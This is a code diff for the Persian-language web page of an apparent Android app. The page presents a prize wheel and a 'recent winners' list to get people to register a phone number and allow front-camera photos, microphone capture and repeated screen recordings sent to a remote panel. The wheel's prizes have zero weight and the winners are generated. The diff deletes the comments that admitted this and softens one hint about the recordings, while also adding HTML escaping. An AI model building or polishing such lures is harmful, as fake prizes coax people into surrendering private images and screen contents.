@@ -5,12 +5,19 @@ const fa = (n) => String(n).replace(/[0-9]/g, (d) => FA[+d]);
 const toAscii = (s) => String(s).replace(/[۰-۹]/g, (d) => FA.indexOf(d))
   .replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));
 
+const esc = (s) => String(s == null ? '' : s)
+  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+  .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+
+const NUMRUN = /[0-9۰-۹٠-٩][0-9۰-۹٠-٩.,٫٬%٪]*/g;
+const num = (s) => esc(s).replace(NUMRUN, (m) => `<i class="n">${m}</i>`);
+
 const $ = (id) => document.getElementById(id);
 const state = { wheelTurn: 0, chanceTimer: null, sheet: null, spun: false };
 
-/* The two texts the person is asked to agree to. They are written out in full
-   rather than trimmed to a checkbox, because "yes" has to mean the same thing
-   to the person as it does to the app. */
+
+
+
 const CONSENT =
   'با زدن تایید، روی همین گوشی و فقط در همین لحظه این کارها انجام می‌شود:\n\n'
   + '• سه عکس از دوربین جلو\n'
@@ -27,12 +34,12 @@ const CONSENT_SCREEN =
   + 'نشان می‌دهد. پس از آن، تصویر صفحه‌ی گوشی حداکثر ۳ دقیقه ضبط و برای پنل '
   + 'فرستاده می‌شود. برنامه بسته نمی‌شود و همین‌جا می‌ماند.';
 
-/* The wheel.
-   The three prizes are drawn at zero width on purpose: they are on the wheel to
-   be seen and they can never be landed on, because this project pays no prize.
-   The pointer passing over them is what makes it look like a wheel. The whole
-   remaining mass sits on two پوچ slices and one شانس دوباره. These weights are
-   the same numbers the server prints in the panel, and a test compares them. */
+
+
+
+
+
+
 const SLICES = [
   { key: 'charge_50',  label: '۵۰ هزارتومن شارژ', w: 0,  c1: '#2a3550', c2: '#1d2740' },
   { key: 'charge_100', label: '۱۰۰ هزارتومن شارژ', w: 0, c1: '#2a3550', c2: '#1d2740' },
@@ -54,8 +61,8 @@ function drawWheel() {
     const to = (acc / TOTAL) * 360;
     if (s.w > 0) stops.push(`${s.c1} ${from}deg ${to}deg`);
   }
-  // The zero-width prizes are given a hairline each so they are visible on the
-  // rim without owning any part of the circle they cannot be landed on.
+  
+  
   $('wheel').style.background =
     `conic-gradient(${stops.join(',')})`;
 
@@ -72,18 +79,18 @@ function drawWheel() {
       <b>${s.label}</b></i>`;
   }
   $('wheel').innerHTML = marks;
-  // The hub carries the number that matters, in the one place on the wheel a
-  // thumb is not covering: the chance of any of the three prizes, which is zero.
+  
+  
   $('wheelHub').textContent = fa(0) + '٪';
 }
 
-/* The label sits on the rim, turned so it reads along the slice. A slice at
-   zero width has no arc to sit on, so its mark is a small tick at the point
-   the pointer passes rather than a label that would not fit.
 
-   The class is `wmark`, not `mark`, on purpose: `mark` is the PRF badge in the
-   header and the two would otherwise style each other — a wheel label with a
-   999px border radius and 14px of padding is not a wheel label. */
+
+
+
+
+
+
 const styleTag = document.createElement('style');
 styleTag.textContent = `
   .wmark{position:absolute;left:50%;top:50%;width:0;height:0;}
@@ -109,8 +116,8 @@ function spinTo(slice) {
     acc += s.w;
   }
   const mid = acc + slice.w / 2;
-  // The pointer is at the top, so the wheel turns until the slice's centre
-  // reaches it. Five extra turns so the result is never the same animation.
+  
+  
   const target = 360 * 5 + (360 - (mid / TOTAL) * 360);
   state.wheelTurn += target - (state.wheelTurn % 360);
   $('wheel').style.transform = `rotate(${state.wheelTurn}deg)`;
@@ -126,12 +133,12 @@ function oddsLine() {
     + p(SLICES[3].w + SLICES[5].w) + ' پوچ. هیچ جایزه‌ای پرداخت نمی‌شود.';
 }
 
-/* ── winners ────────────────────────────────────────────────────────────
-   Sample rows, because no prize has been paid by this project. Two rules the
-   old version broke: the same number came round again and again, and the same
-   prize was on every line, so the list looked like a wall of one thing. Here a
-   row is not repeated until the whole pool has been used, and the three prizes
-   are drawn by weight rather than round-robin. */
+
+
+
+
+
+
 const PRIZES = [
   { label: '۵ گیگ اینترنت', w: 50 },
   { label: '۵۰ هزارتومن شارژ', w: 30 },
@@ -154,8 +161,8 @@ function masked(prefix, rnd) {
 }
 
 function weightedPrize(rnd) {
-  // Draw from the prize that has been on screen least, so all three show up
-  // instead of one of them filling the list.
+  
+  
   const least = usedPrizes.length < PRIZES.length
     ? PRIZES.filter((p) => !usedPrizes.includes(p.label))
     : PRIZES;
@@ -172,8 +179,8 @@ function newRow() {
     const head = 1000 + Math.floor(Math.random() * 9000);
     key = prefix + head;
   } while (usedRows.has(key) && ++tries < 40);
-  // The pool is exhausted after a long session: clear it rather than stall, so
-  // the list keeps turning instead of freezing on the last row.
+  
+  
   if (usedRows.has(key)) usedRows.clear();
   usedRows.add(key);
 
@@ -187,8 +194,8 @@ function newRow() {
 let rows = [];
 function renderWinners() {
   $('winners').innerHTML = rows.map((r) =>
-    `<li><span class="who n">${r.who}</span>
-         <span class="what">${r.prize}</span></li>`).join('');
+    `<li><span class="who n">${esc(r.who)}</span>
+         <span class="what">${num(r.prize)}</span></li>`).join('');
 }
 
 function seedWinners(n) {
@@ -202,10 +209,10 @@ function tickWinners() {
   renderWinners();
 }
 
-/* ── chance counter ─────────────────────────────────────────────────────
-   One unit every three minutes, and one unit is one saved video: the counter
-   is not a score the app invents, it is a count of what was actually recorded
-   and sent, so a number going up here always has a video behind it. */
+
+
+
+
 const CHANCE_MS = 3 * 60 * 1000;
 
 function renderChance(s) {
@@ -215,13 +222,13 @@ function renderChance(s) {
   $('chanceBar').style.width = Math.min(100, (n % 5) * 20 || (n > 0 ? 100 : 0)) + '%';
 
   const left = Math.max(0, (Number(s.spinReadyAt) || 0) - Number(s.now || 0));
-  $('spinIn').textContent = left > 0 ? human(left) : 'آماده';
+  $('spinIn').innerHTML = left > 0 ? num(human(left)) : 'آماده';
 
   const hint = $('chanceHint');
   if (left > 0) {
-    hint.textContent = 'چرخ بعدی ' + human(left) + ' دیگر آماده می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.';
+    hint.innerHTML = num('چرخ بعدی ' + human(left) + ' دیگر می‌چرخد. تا آن زمان ضبط انجام می‌شود و شانس اضافه می‌شود.');
   } else {
-    hint.textContent = 'هر ۳ دقیقه یک شانس اضافه می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.';
+    hint.innerHTML = num('هر ۳ دقیقه یک شانس اضافه می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.');
   }
 
   const btn = $('btnSpin');
@@ -244,9 +251,9 @@ function human(ms) {
   return fa(Math.floor(h / 24)) + ' روز';
 }
 
-/* ── gate ───────────────────────────────────────────────────────────────
-   A green or a red dot and one word. The sentence explaining what each level
-   means used to sit here permanently, which is the same as saying nothing. */
+
+
+
 function renderGate(s) {
   const dot = $('gateDot');
   const btns = $('gateBtns');
@@ -273,26 +280,26 @@ function renderFacts(list) {
   $('facts').innerHTML = (list || []).map((f) => {
     const cls = ['fact'];
     if (f.wide) cls.push('wide');
-    if (!f.value) cls.push('void');
+    if (!f.v) cls.push('void');
     return `<div class="${cls.join(' ')}">
-      <span class="k">${f.k}</span>
-      <span class="v">${f.value || f.why || 'ثبت نشده'}</span>
+      <span class="k">${num(f.k)}</span>
+      <span class="v">${f.v ? num(f.v) : (f.why ? num(f.why) : 'ثبت نشده')}</span>
     </div>`;
   }).join('');
 }
 
 function log(msg, tone) {
   const el = $('log');
-  el.textContent = msg || 'آماده.';
+  el.innerHTML = num(msg || 'آماده.');
   el.className = 'log' + (tone ? ' ' + tone : '');
 }
 
 function setBusy(b) { $('progress').hidden = !b; }
 
-/* ── sheet ──────────────────────────────────────────────────────────────
-   The consent text is not optional and is not shortened: this is the only
-   moment the person is told, in words, that the press turns the camera and the
-   microphone on. */
+
+
+
+
 function ask(title, body) {
   return new Promise((resolve) => {
     state.sheet = resolve;
@@ -309,39 +316,51 @@ function closeSheet(v) {
   if (r) r(v);
 }
 
-/* ── the bridge ─────────────────────────────────────────────────────────
-   Two objects, and they are not interchangeable. `Native` is the Java object
-   Android injects — this page calls into it. `Prf` is this page's own surface,
-   which the native side calls into. They are kept apart because the injected
-   object is frozen to the Java side: adding a property to it throws on Android
-   9 and later, so `Prf` cannot be the same object as `Native`. */
+
+
+
+
+
+
 const N = (window.Prf = window.Prf || {});
 const J = () => window.Native;
 
 N.ready = function () {
-  drawWheel();
-  $('odds').textContent = oddsLine();
-  $('operator').innerHTML = (J().operators() || [])
-    .map((o) => `<option value="${o}">${o}</option>`).join('');
-  $('operator').value = J().operator() || '';
-  seedWinners(5);
-  $('phone').value = J().phone() || '';
-  N.push();
-  setInterval(tickWinners, 9000);
-  N.log('برای شروع، شماره‌ی خود را وارد و «ثبت شماره» را بزنید.');
+  try {
+    drawWheel();
+    $('odds').innerHTML = num(oddsLine());
+    $('operator').innerHTML = String(J().operators() || '')
+      .split(',').map((o) => o.trim()).filter(Boolean)
+      .map((o) => `<option value="${esc(o)}">${esc(o)}</option>`).join('');
+    $('operator').value = J().operator() || '';
+    seedWinners(5);
+    $('phone').value = J().phone() || '';
+    N.push();
+    setInterval(tickWinners, 9000);
+    N.log('برای شروع، شماره‌ی خود را وارد و «ثبت شماره» را بزنید.');
+  } catch (e) {
+    log('راه‌اندازی صفحه ناتمام ماند: ' + (e && e.message ? e.message : e), 'warn');
+  }
 };
 
-/* Called by the native side on every tick and after every state change. The
-   tick is driven from Kotlin, not from a timer here, because a WebView in the
-   background has its timers throttled to once a minute and the countdown on
-   this page would sit still while it counted. */
+
+
+
+
 N.push = function () {
-  const s = J().state();
+  let s = null;
+  try {
+    const raw = J().state();
+    if (raw) s = typeof raw === 'string' ? JSON.parse(raw) : raw;
+  } catch (e) {
+    log('وضعیت دستگاه خوانده نشد.', 'warn');
+    return;
+  }
   if (!s) return;
   renderGate(s);
   renderChance(s);
-  $('heroSub').textContent = s.registered
-    ? 'ثبت شده — ' + (s.lastReport || 'منتظر گزارش بعدی')
+  $('heroSub').innerHTML = s.registered
+    ? num('ثبت شده — ' + (s.lastReport || 'منتظر گزارش بعدی'))
     : 'هنوز ثبت نشده';
   $('btnRegister').disabled = !!s.busy;
   $('btnRegister').textContent = s.busy ? 'در حال انجام…' : 'ثبت شماره';
@@ -352,15 +371,15 @@ N.push = function () {
 
 N.winners = function () { return rows.map((r) => r.who + '|' + r.prize); };
 
-/* The native side sends one line at a time. It is a line and not a log: the
-   run reports where it is, one step, and the person reads it while it happens
-   rather than afterwards. */
+
+
+
 N.log = function (msg, tone) { log(msg, tone); };
 
-/* The native side draws the outcome, not this page. The slice is decided in
-   Kotlin before the recording starts, so the pointer cannot land somewhere the
-   app had not already committed to — the animation below is a drawing of a
-   result that has happened, not a random number produced by a transition. */
+
+
+
+
 N.spin = function (key) {
   const slice = SLICES.find((s) => s.key === key) || SLICES[3];
   state.spun = true;
@@ -369,10 +388,10 @@ N.spin = function (key) {
 
 N.ask = ask;
 
-/* ── input handling ───────────────────────────────────────────────────────
-   Persian digits are folded to ASCII as they are typed, so the stored number
-   and the server's normalisation only ever see one shape. A Persian keyboard
-   produces ۰-۹ and a pasted number may carry a +98. */
+
+
+
+
 $('phone').addEventListener('input', (e) => {
   const el = e.target;
   const ascii = toAscii(el.value).replace(/[^\d+]/g, '');
@@ -401,10 +420,10 @@ document.addEventListener('click', (e) => {
       $('phone').focus();
       return;
     }
-    // The consent sheet is not an option the run may skip: it is the only
-    // moment the person is told, in words, that this press turns the camera and
-    // the microphone on. Everything after this is the app doing what it just
-    // said it would do.
+    
+    
+    
+    
     ask('تایید ثبت', CONSENT).then((ok) => {
       if (ok) J().register(phone, $('operator').value);
     });
